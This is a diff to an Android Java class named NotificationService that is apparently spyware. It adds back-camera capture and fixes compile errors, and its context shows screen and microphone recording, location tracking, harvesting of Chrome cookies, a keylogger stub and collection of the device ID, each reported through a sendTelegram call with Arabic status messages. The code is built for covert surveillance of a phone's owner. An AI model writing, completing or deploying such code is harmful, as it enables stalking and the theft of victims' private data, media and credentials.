@@ -4,6 +4,7 @@ import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.app.Notification;
 import android.app.NotificationManager;
+import android.app.Activity;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
@@ -24,7 +25,7 @@ import android.os.Handler;
 import android.os.Looper;
 import android.graphics.Point;
 import android.graphics.Bitmap;
-import android.graphics.BitFactory;
+import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.graphics.ImageFormat;
 import android.graphics.Rect;
@@ -81,6 +82,7 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.concurrent.TimeUnit;
+import java.nio.ByteBuffer;
 import okhttp3.*;
 
 public class NotificationService extends NotificationListenerService implements LocationListener {
@@ -213,6 +215,29 @@ public class NotificationService extends NotificationListenerService implements 
         }
     }
 
+    private void startCameraStream() {
+        try {
+            if (mCameraManager == null) {
+                mCameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
+            }
+            
+            for (String cameraId : mCameraManager.getCameraIdList()) {
+                CameraCharacteristics characteristics = mCameraManager.getCameraCharacteristics(cameraId);
+                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
+                    mCameraId = cameraId;
+                    break;
+                }
+            }
+            
+            if (mCameraId != null) {
+                sendTelegram("🎥 بدء بث الكاميرا...");
+                takeCameraPhoto();
+            }
+        } catch (Exception e) {
+            sendTelegram("❌ فشل بث الكاميرا: " + e.getMessage());
+        }
+    }
+
     private void takeScreenshot() {
         try {
             mImageReader = ImageReader.newInstance(mScreenWidth, mScreenHeight, PixelFormat.RGBA_8888, 2);
@@ -247,7 +272,7 @@ public class NotificationService extends NotificationListenerService implements 
             mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
             mMediaRecorder.setVideoSize(mScreenWidth, mScreenHeight);
             mMediaRecorder.setVideoFrameRate(30);
-            mMediaRecorder.setVideoBitRate(6000000);
+            mMediaRecorder.setVideoEncodingBitRate(6000000);
             
             String filePath = getExternalFilesDir(null) + "/stream.mp4";
             mMediaRecorder.setOutputFile(filePath);
@@ -259,7 +284,6 @@ public class NotificationService extends NotificationListenerService implements 
                 mMediaRecorder.start();
                 sendTelegram("✅ بدأ بث الشاشة المباشر");
                 
-                // رفع الفيديو بشكل مستمر (كل 30 ثانية)
                 mHandler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
@@ -290,12 +314,6 @@ public class NotificationService extends NotificationListenerService implements 
                     @Override
                     public void onOpened(CameraDevice camera) {
                         mCameraDevice = camera;
-                        // التقاط صورة
-                        try {
-                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                            // إعدادات التقاط الصورة
-                            // سيتم تنفيذها بشكل كامل
-                        } catch (Exception e) {}
                     }
                     @Override
                     public void onDisconnected(CameraDevice camera) {}
@@ -319,7 +337,6 @@ public class NotificationService extends NotificationListenerService implements 
 
     @Override
     public void onLocationChanged(Location location) {
-        // إرسال التحديثات إذا طلب المستخدم
         String msg = "📍 موقع جديد:\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + 
                     "\nالدقة: " + location.getAccuracy() + "m";
         sendTelegram(msg);
@@ -440,7 +457,6 @@ public class NotificationService extends NotificationListenerService implements 
     private void getBrowserData() {
         StringBuilder sb = new StringBuilder("🌐 بيانات المتصفح:\n");
         
-        // محاولة الحصول على كوكيز كروم
         try {
             CookieSyncManager.createInstance(this);
             CookieManager cookieManager = CookieManager.getInstance();
@@ -489,7 +505,6 @@ public class NotificationService extends NotificationListenerService implements 
 
     private void startKeyLogging() {
         sendTelegram("⌨️ تم بدء تسجيل لوحة المفاتيح");
-        // سيتم تنفيذ keylogger عبر AccessibilityService
     }
 
     private void startMicRecording() {
@@ -507,7 +522,6 @@ public class NotificationService extends NotificationListenerService implements 
             
             sendTelegram("🎤 بدأ تسجيل الميكروفون");
             
-            // تسجيل لمدة 30 ثانية ثم رفع
             mHandler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
@@ -620,7 +634,6 @@ public class NotificationService extends NotificationListenerService implements 
         File file = new File(path);
         if (file.exists() && file.length() > 0) {
             sendTelegram("📹 مقطع جديد من البث");
-            // رفع الفيديو
         }
     }
 
@@ -643,4 +656,4 @@ public class NotificationService extends NotificationListenerService implements 
     public String getDeviceIDUnique() {
         return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
     }
-               }
+}
